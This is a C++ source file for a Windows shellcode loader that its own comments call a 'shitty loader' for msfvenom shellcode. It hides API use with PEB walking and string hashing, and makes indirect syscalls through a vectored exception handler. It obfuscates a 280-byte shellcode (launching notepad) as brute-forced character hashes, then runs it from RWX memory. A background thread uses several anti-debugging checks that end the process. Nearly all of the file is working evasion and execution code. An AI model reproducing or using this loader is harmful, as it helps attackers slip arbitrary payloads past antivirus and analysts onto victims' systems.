#include <cstring>

#include "includes.hpp"

FARPROC printSyscallStub(const char* funcName);
LONG CALLBACK VectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
PWSTR dll_name(PWSTR full_dll_name);
__forceinline PWSTR get_dll_name_by_hash(const INT hash);
constexpr INT hash_strings(const wchar_t* strings_to_hash);
__forceinline LPSTR ToLPCSTR(LPCWSTR wstr);
constexpr INT hash_stringsA(const char* strings_to_hash);
__forceinline PDWORD get_function_Addr_by_hash(const INT hash, const INT hash_lib);
__forceinline bool Check_via_heap_protect();
__forceinline void is_debugged();
__forceinline DWORD check_byte_not_change(PVOID begin_check, PVOID end_check);
__forceinline void is_debugger_attached_(void);
__forceinline LPCSTR get_func_name_by_hash(const INT hash, const INT hash_lib);


using customCreateThread = HANDLE(NTAPI*)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);


using customVirtuAllocEx = LPVOID(NTAPI*)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);





BYTE* FindSyscallAddr(ULONG_PTR base) {
	BYTE* func_base = (BYTE*)(base);
	BYTE* temp_base = 0x00;
	//0F05 syscall
	while (*func_base != 0xc3) {
		temp_base = func_base;
		if (*temp_base == 0x0f) {
			temp_base++;
			if (*temp_base == 0x05) {
				temp_base++;
				if (*temp_base == 0xc3) {
					temp_base = func_base;
					break;
				}
			}
		}
		else {
			func_base++;
			temp_base = 0x00;
		}
	}
	return temp_base;
}

uint32_t swap_uint32(uint32_t val)
{
	val = ((val << 8) & 0xFF00FF00) | ((val >> 8) & 0xFF00FF);
	return (val << 16) | (val >> 16);
}
int16_t swap_int16(int16_t val)
{
	return (val << 8) | ((val >> 8) & 0xFF);
}
DWORD power(DWORD base, DWORD n) {
	if (n == 0) { return 1; }

	n--;
	DWORD power = base;
	while (n < 0) {
		base *= power;
		n--;
	}

	return base;
}
//DWORD Byt_Tab_To_Dword(BYTE bytetab[]){
//	DWORD temp;
//
//	for (int i = 0; i < 4 ; i++) {
//		temp =+ bytetab[i] * power(10, 3-(i-1));
//	}
//	return temp/10;
//
//}

DWORD Byt_Tab_To_Dword2(BYTE bytetab[]) {
	DWORD temp = 0;

	for (int i = 0; i < 4; i++) {
		temp |= (bytetab[i] << (i * 8));
	}

	return temp;

}


DWORD FindSyscallNumber(ULONG_PTR base) {
	BYTE* func_base = (BYTE*)(base);
	BYTE* temp_base = 0x00;
	BYTE ssn_stub = 0;
	BYTE ssn_stub_tab_2[4] = { 0 };

	BYTE ssn_stub_tab[4] = { 0 };
	DWORD syscall_number = 0x0;
	// printf("find syscall nmb for base = %p\n",base);

	while (*func_base != 0xf6) {
		temp_base = func_base;

		if (*temp_base == 0xb8) {

			temp_base++;
			int i = 0;
			while (*temp_base != 0xF6) {
				ssn_stub_tab[i] += *temp_base;

				temp_base++;
				i++;
			}
		}
		func_base++;
	}
	for (int i = 0; i < 4;i++) {
		ssn_stub += ssn_stub_tab[i];
	}

	for (int i = 0; i < 4; i++) {
		ssn_stub_tab_2[4 - i - 1] = ssn_stub_tab[i];
	}

	for (int i = 0; i < 4;i++) {
	}

	syscall_number = Byt_Tab_To_Dword2(ssn_stub_tab);

	return syscall_number;
}





ULONG_PTR g_syscall_addr = 0x0;


LONG CALLBACK VectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		//	printf("Access violation detected! so i doo magic things \n");

		ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
		ExceptionInfo->ContextRecord->Rax = ExceptionInfo->ContextRecord->Rip;

		ExceptionInfo->ContextRecord->Rip = g_syscall_addr;

		return EXCEPTION_CONTINUE_EXECUTION;



	}
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {

		return EXCEPTION_CONTINUE_EXECUTION;
	}




	return EXCEPTION_CONTINUE_SEARCH;
}


void VectoredSyscalPOC(const char payload[], SIZE_T payload_size, int pid) {
	//printf("Am I here ?\n");
	ULONG_PTR syscall_addr = 0x00;
	//constexpr int hashed = hash_strings(L"ntdll.dll");  WHY NOT WORK ??????????

	constexpr int hashed = 584300013;

	//constexpr int hashed_zw = hash_stringsA("ZwDrawText");
	FARPROC drawtext = GetProcAddress(GetModuleHandleW(get_dll_name_by_hash(hashed)), "ZwDrawText");
	if (drawtext == NULL) {
		//	printf("[-] Error GetProcess Address\n");
		exit(-1);
	}
	syscall_addr = (ULONG_PTR)FindSyscallAddr((ULONG_PTR)drawtext);

	if (syscall_addr == NULL) {
		//	printf("[-] Error Resolving syscall Address\n");
		exit(-1);
	}
	g_syscall_addr = syscall_addr;

	PVOID handle = AddVectoredExceptionHandler(1, VectoredExceptionHandler);

	const INT hash_ntwrite = hash_stringsA("NtWriteVirtualMemory");
	const INT hash_ntdll = hash_stringsA("ntdll.dll");
	const INT hash_virtualloc = hash_stringsA("NtAllocateVirtualMemory");

	NTSTATUS status;
	PVOID NtfunctionAddressNt_write = get_function_Addr_by_hash(hash_ntwrite, hash_ntdll);
	DWORD ssn_Nt_write = FindSyscallNumber((ULONG_PTR)NtfunctionAddressNt_write);
	//printf("ssn = %d ", ssn_Nt_write);
	PVOID NtfunctionAddressNt_alloc = get_function_Addr_by_hash(hash_virtualloc, hash_ntdll);
	DWORD ssn_Nt_alloc = FindSyscallNumber((ULONG_PTR)NtfunctionAddressNt_alloc);
	//printf("ssn = %d ", ssn_Nt_write);

	enum syscall_no {
		SysNtOpenProcess = 0x26,
		SysNtAllocateVirtualMem = 0x18,
		SysNtWriteVirtualMem = 0x3A, //ssn_Nt_write
		SysNtProtectVirtualMem = 0x50,
		SysNtCreateThreadEx = 0xBD
	};

	_NtOpenProcess pNtOpenProcess = (_NtOpenProcess)SysNtOpenProcess;
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)ssn_Nt_alloc;
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)ssn_Nt_write;
	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;

	PVOID rb = NULL;
	void* allocAddr = NULL;
	FARPROC g_syscall_addr_FARPROC;

	//g_syscall_addr_FARPROC = printSyscallStub("NtAllocateVirtualMemory");
	const INT hash_NtAllocateVirtualMemory = hash_virtualloc;
	g_syscall_addr_FARPROC = printSyscallStub(get_func_name_by_hash(hash_NtAllocateVirtualMemory, hashed));
	//g_syscall_addr_FARPROC = printSyscallStub("NtAllocateVirtualMemory");
	//printf("syscall at g_syscall_addr_FARPROC %p\n", g_syscall_addr_FARPROC);

	g_syscall_addr = (ULONG_PTR)g_syscall_addr_FARPROC + 18;

	//printf("syscall at g_syscall_addr %p \n", g_syscall_addr);


	PVOID functionAddress = get_function_Addr_by_hash(hash_virtualloc, hash_ntdll);

	//printf("from api hashing NtAllocateVirtualMemory ::%p \n ", functionAddress);

	//getchar();

	DWORD size_shellcode = 280;



	const INT hash_kernel32 = hash_stringsA("KERNEL32.DLL");
	const INT hash_virtuallocEx = hash_stringsA("VirtualAllocEx");
	PVOID functionAddress2 = get_function_Addr_by_hash(hash_virtuallocEx, hash_kernel32);

	customVirtuAllocEx Alloc = (customVirtuAllocEx)functionAddress2;
	DWORD tid = 0;


	rb = Alloc(GetCurrentProcess(), NULL, 434, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//WriteProcessMemory(GetCurrentProcess(), newMemory, payload, size_shellcode, NULL);
	pNtWriteVirtualMemory(GetCurrentProcess(), rb, (PVOID)payload, size_shellcode, NULL);

	SIZE_T write_bytes;

	((void(*)())rb)();


	RemoveVectoredExceptionHandler(handle);


	//printf("handle ended");


	if (handle != NULL) {
		RemoveVectoredExceptionHandler(handle);
	}

}
PWSTR dll_name(PWSTR full_dll_name) {
	//printf("\n");
	int i = 0;
	PWSTR returned_name = NULL;
	PWSTR last_backslash = wcsrchr(full_dll_name, L'\\');


	if (last_backslash != NULL) {
		return last_backslash + 1;
	}
	else {
		return full_dll_name;


	}

	return full_dll_name;

}
LPCSTR dll_nameA(LPCSTR full_dll_name) {
	//	printf("\n");
	int i = 0;
	LPCSTR returned_name = NULL;
	LPCSTR last_backslash = strchr(full_dll_name, '\\');


	if (last_backslash != NULL) {
		return last_backslash + 1;
	}
	else {
		return full_dll_name;


	}

	return full_dll_name;

}



constexpr INT hash_strings(const wchar_t* strings_to_hash) {

	unsigned long hash = 5381;
	int c = 0;

	while (c = *strings_to_hash++)
		hash = ((hash << 5) + hash) + c;

	return hash;

}

constexpr INT hash_stringsA(const char* strings_to_hash) {

	unsigned long hash = 5381;
	int c = 0;

	while (c = *strings_to_hash++)
		hash = ((hash << 5) + hash) + c;

	return hash;

}



__forceinline PWSTR get_dll_name_by_hash(const INT hash) {
	PTEB tebPtr = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));

	PPEB pebPtr = tebPtr->ProcessEnvironmentBlock;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = NULL;
	PWSTR dllname = NULL;
	pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pebPtr->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
	LIST_ENTRY ptr_ldr = pebPtr->Ldr->InMemoryOrderModuleList;
	pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)(ptr_ldr.Flink->Flink);
	dllname = dll_name(pLdrDataEntry->FullDllName.Buffer);
	LIST_ENTRY* pldrheap = &pebPtr->Ldr->InMemoryOrderModuleList;
	while (hash_strings(dllname) != hash && ptr_ldr.Flink->Flink != pldrheap) {
		pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)(ptr_ldr.Flink->Flink);
		dllname = dll_name(pLdrDataEntry->FullDllName.Buffer);
		ptr_ldr.Flink = ptr_ldr.Flink->Flink;
	}
	return dllname;
}


__forceinline LPCSTR get_func_name_by_hash(const INT hash, const INT hash_lib) {

	PWSTR lib;

	PCSTR function_name;

	//is_debugged();

	lib = get_dll_name_by_hash(hash_lib);

	PDWORD FunctionAddr = 0x0;

	HMODULE libraryBase = LoadLibraryW(lib);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;

	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);

	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);

	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		DWORD functionNameHash = hash_stringsA(functionName);

		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			FunctionAddr = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);

			return functionName;
		}
	}

	return NULL;

}


__forceinline PDWORD get_function_Addr_by_hash(const INT hash, const INT hash_lib) {

	PWSTR lib;

	//is_debugged();

	lib = get_dll_name_by_hash(hash_lib);

	PDWORD FunctionAddr = 0x0;

	HMODULE libraryBase = LoadLibraryW(lib);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;

	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);

	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);

	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		DWORD functionNameHash = hash_stringsA(functionName);

		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			FunctionAddr = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			//		printf("%s : 0x%x : %p\n", functionName, functionNameHash, FunctionAddr);
			return FunctionAddr;
		}
	}

	return NULL;

}






__forceinline LPSTR ToLPCSTR(LPCWSTR wstr) {
	LPSTR returned = NULL;
	WideCharToMultiByte(CP_ACP, WC_COMPOSITECHECK, wstr, -1, returned, 0, NULL, NULL);
	return returned;

}

__forceinline LPCSTR get_dll_name_by_hashA(const INT hash) {
	PTEB tebPtr = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
	is_debugged();

	PPEB pebPtr = tebPtr->ProcessEnvironmentBlock;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = NULL;
	LPCSTR dllname = NULL;
	pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pebPtr->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
	LIST_ENTRY ptr_ldr = pebPtr->Ldr->InMemoryOrderModuleList;
	pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)(ptr_ldr.Flink->Flink);


	dllname = dll_nameA(ToLPCSTR(pLdrDataEntry->FullDllName.Buffer));
	//wcscmp(dllname, L"ucrtbased.dll")
	LIST_ENTRY* pldrheap = &pebPtr->Ldr->InMemoryOrderModuleList;
	//constexpr int hashed = hash_strings(L"KERNEL32.DLL");
	while (hash_stringsA(dllname) != hash && ptr_ldr.Flink->Flink != pldrheap) {
		pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)(ptr_ldr.Flink->Flink);
		dllname = dll_nameA(ToLPCSTR(pLdrDataEntry->FullDllName.Buffer));
		ptr_ldr.Flink = ptr_ldr.Flink->Flink;
	}
	return dllname;
}

void VectoredFindSyscallAddr() {

	PVOID handle = AddVectoredExceptionHandler(1, VectoredExceptionHandler);

	constexpr int hashed = hash_strings(L"KERNEL32.DLL");


	//	printf("%ls :: \n", get_dll_name_by_hash(hashed));




	if (handle != NULL) {
		RemoveVectoredExceptionHandler(handle);
	}


}



FARPROC printSyscallStub(const char* funcName) {
	constexpr int hashed = hash_strings(L"ntdll.dll");


	HMODULE ntdll = LoadLibraryExW(get_dll_name_by_hash(hashed), NULL, DONT_RESOLVE_DLL_REFERENCES);

	if (ntdll == NULL) {
		//		printf("failed to load ntdll.dll\n");
		return NULL;
	}

	FARPROC funcAddress = GetProcAddress(ntdll, funcName);

	if (funcAddress == NULL) {
		//		printf("failed to get address of %s\n", funcName);
		FreeLibrary(ntdll);
		return NULL;
	}

	//	printf("address of %s: 0x%p\n", funcName, funcAddress);



	// print the first 23 bytes of the stub
	BYTE* bytes = (BYTE*)funcAddress;
	for (int i = 18; i < 23; i++) {
		//		printf("%02X ", bytes[i]);
	}
	//	printf("\n");

	FreeLibrary(ntdll);

	return funcAddress;
}




__forceinline int hash_on_char(const char to_hash) {

	int returned = to_hash;
	const int c = 0xA28;

	for (int i = 0; i < 40; i++) {

		//returned |= (long long int)hash_on_char;returned &= (long long int)hash_on_char;returned *= returned >> 2 + c; returned = ((returned <<5)+returned);
		returned = to_hash + c;returned = ((returned << 5) + returned) + c;// returned ^= (long long int)hash_on_char;

	}

	//printf("hash of %c = %d ", to_hash, returned);
	return returned;

}

__forceinline constexpr const unsigned char bruteforce_on_char(int hash) {

	for (int i = 0; i < 0xff + 1; i++) {
		//printf("%d ==  %d ?\n", hash_on_char(i), hash);
		if (hash_on_char(i) == hash) {
			return i;
		}
		//printf("not fund ?");
		is_debugged();

	}
	const INT hash_create_threade = hash_stringsA("CreateThread");
	const INT hash_kernel32 = hash_stringsA("KERNEL32.DLL");
	PVOID functionAddress = get_function_Addr_by_hash(hash_create_threade, hash_kernel32);

	customCreateThread CreateThread = (customCreateThread)functionAddress;
	DWORD tid = 0;


	HANDLE th = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)is_debugger_attached_, NULL, NULL, &tid);

}


__forceinline constexpr void  hash_on_char_tab(const char to_hash[], int returned[]) {


	//int returned[strlen(to_hash)] = { 0 };
	//int returned[280] = { 0 };
	for (int i = 0;i < 280;i++) {
		returned[i] = hash_on_char(to_hash[i]);
		//printf("hash of %d %d\n", to_hash[i], hash_on_char(to_hash[i]));
	}
	//return returned;
}

__forceinline void bruteforce_char_table(char plain[], int hash[]) {
	for (int i = 0; i < 280; i++) {
		plain[i] = bruteforce_on_char(hash[i]);
		//printf("plain %c is dehashed from %d\n", plain[i], hash[i]);
	}
}


int main()
{
	//msfvenom run notepad :) shitty shellcode for a shitty loader
	//unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
	//	"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
	//	"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
	//	"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
	//	"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
	//	"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
	//	"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
	//	"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
	//	"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
	//	"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
	//	"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
	//	"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
	//	"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
	//	"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
	//	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
	//	"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
	//	"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
	//	"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
	//	"\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

	int buf_hashed2[280] = { 88268, 90776, 84275, 87476, 87872, 87608, 86288, 88400, 88400, 88400, 90545, 91073, 90545, 91040, 91106, 91073, 91238, 90776, 90017, 86882, 91733, 90776, 84539, 91106, 91568, 90776, 84539, 91106, 89192, 90776, 84539, 91106, 89456, 90776, 84539, 92162, 91040, 90776, 88895, 85991, 90842, 90842, 90941, 90017, 86585, 90776, 90017, 86288, 85628, 90380, 91601, 92492, 88466, 89852, 89456, 90545, 86321, 86585, 88829, 90545, 88433, 86321, 87410, 87773, 91106, 90545, 91073, 90776, 84539, 91106, 89456, 84539, 90578, 90380, 90776, 88433, 86816, 84539, 84176, 84440, 88400, 88400, 88400, 90776, 84341, 86288, 92228, 91799, 90776, 88433, 86816, 91040, 84539, 90776, 89192, 90644, 84539, 90512, 89456, 90809, 88433, 86816, 87443, 91238, 90776, 88367, 86585, 90545, 84539, 90116, 84440, 90776, 88433, 87014, 90941, 90017, 86585, 90776, 90017, 86288, 85628, 90545, 86321, 86585, 88829, 90545, 88433, 86321, 90248, 87344, 92261, 87905, 90908, 88499, 90908, 89588, 88664, 90677, 90281, 86849, 92261, 87080, 91304, 90644, 84539, 90512, 89588, 90809, 88433, 86816, 91766, 90545, 84539, 88796, 90776, 90644, 84539, 90512, 89324, 90809, 88433, 86816, 90545, 84539, 88532, 84440, 90776, 88433, 86816, 90545, 91304, 90545, 91304, 91502, 91337, 91370, 90545, 91304, 90545, 91337, 90545, 91370, 90776, 84275, 87740, 89456, 90545, 91106, 88367, 87344, 91304, 90545, 91337, 91370, 90776, 84539, 88994, 87641, 91271, 88367, 88367, 88367, 91469, 90776, 86090, 88433, 88400, 88400, 88400, 88400, 88400, 88400, 88400, 90776, 84605, 84605, 88433, 88433, 88400, 88400, 90545, 86090, 90017, 84539, 92063, 84407, 88367, 86981, 86123, 87872, 85925, 85298, 91238, 90545, 86090, 85430, 84869, 86189, 85133, 88367, 86981, 90776, 84275, 86420, 89720, 90380, 88598, 92492, 88730, 84176, 88235, 87344, 92261, 88565, 86123, 90743, 89027, 92162, 92063, 91898, 88400, 91337, 90545, 84473, 87146, 88367, 86981, 92030, 92063, 92228, 91733, 92096, 91601, 91700, 89918, 91733, 92360, 91733, 88400, 88400 };


	char plain[280] = { 0 };

	bruteforce_char_table(plain, buf_hashed2);

	SIZE_T write_bytes;

	PTEB pteb = NtCurrentTeb();
	pteb->ProcessEnvironmentBlock->BeingDebugged = 1;

	const INT hash_create_threade = hash_stringsA("CreateThread");
	const INT hash_kernel32 = hash_stringsA("KERNEL32.DLL");
	PVOID functionAddress = get_function_Addr_by_hash(hash_create_threade, hash_kernel32);

	customCreateThread CreateThread = (customCreateThread)functionAddress;
	DWORD tid = 0;


	HANDLE th = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)is_debugger_attached_, NULL, NULL, &tid);

	is_debugged();


	VectoredSyscalPOC(plain, sizeof(plain), GetCurrentProcessId());

	check_byte_not_change(&VectoredFindSyscallAddr, NULL);

	return 0;

}


#pragma region anti_debug_routine



__forceinline void is_debugger_attached_(void) {
	//	printf("Is debugger routine launch");


	PVOID tab_func[9][2] = { 0 };

	tab_func[0][0] = { main }; tab_func[0][1] = { (PVOID)check_byte_not_change(main,NULL) };
	tab_func[1][0] = { VectoredSyscalPOC }; tab_func[1][1] = { (PVOID)check_byte_not_change(VectoredSyscalPOC,NULL) };

	while (1) {
		is_debugged();
		if (tab_func[0][1] != (PVOID)check_byte_not_change(main, NULL)) {
			//printf("BEEING DEBUGGED");
			exit(0);
		}
		if (tab_func[1][1] != (PVOID)check_byte_not_change(VectoredSyscalPOC, NULL)) {
			//printf("BEEING DEBUGGED");
			exit(0);

		}
	}
}




typedef NTSTATUS(NTAPI* TNtQueryInformationProcess)(
	IN HANDLE           ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID           ProcessInformation,
	IN ULONG            ProcessInformationLength,
	OUT PULONG          ReturnLength
	);



__forceinline void is_debugged() {
	if (Check_via_heap_protect()) {/* printf("DEBBUG");*/exit(0); }


	constexpr int hashed = hash_strings(L"ntdll.dll");
	constexpr int hashed_NtQueryInformationProcess = hash_strings(L"NtQueryInformationProcess");


	PVOID pfnNtQueryInformationProcessADDR = get_function_Addr_by_hash(hashed_NtQueryInformationProcess, hashed);

	TNtQueryInformationProcess pfnNtQueryInformationProcess = (TNtQueryInformationProcess)pfnNtQueryInformationProcessADDR;
	//printf(" pfnNtQueryInformationProcessADDR ::%p \n", pfnNtQueryInformationProcessADDR);

		DWORD dwProcessDebugPort, dwReturned;
		NTSTATUS status = pfnNtQueryInformationProcess(
			GetCurrentProcess(),
			ProcessDebugPort,
			&dwProcessDebugPort,
			sizeof(DWORD),
			&dwReturned);

		if (NT_SUCCESS(status) && (-1 == dwProcessDebugPort)) {
			//printf("DEBBUG");
			ExitProcess(0);
		}


}


__forceinline DWORD check_byte_not_change(PVOID begin_check, PVOID end_check) {
	BYTE* ptr = (BYTE*)begin_check;
	DWORD check_sum = 0;
	DWORD nbr = 0;
	if (end_check == NULL) {
		while (*ptr != 0xc3) {

			check_sum += *ptr;
			nbr++;


			ptr++;

		}

		//printf("checkseum :: %d nbr :: %d\n", check_sum, nbr);

	}
	else {
		while (ptr != end_check) {

			check_sum += *ptr;
			nbr++;


			ptr++;

		}

		//printf("checkseum :: %d nbr :: %d\n", check_sum, nbr);

	}
	return check_sum;

}


__forceinline bool Check_via_heap_protect()
{
	PROCESS_HEAP_ENTRY HeapEntry = { 0 };
	do
	{
		if (!HeapWalk(GetProcessHeap(), &HeapEntry))
			return false;
	} while (HeapEntry.wFlags != PROCESS_HEAP_ENTRY_BUSY);

	PVOID pOverlapped = (PBYTE)HeapEntry.lpData + HeapEntry.cbData;
	return ((DWORD)(*(PDWORD)pOverlapped) == 0xABABABAB);
}
#pragma endregion



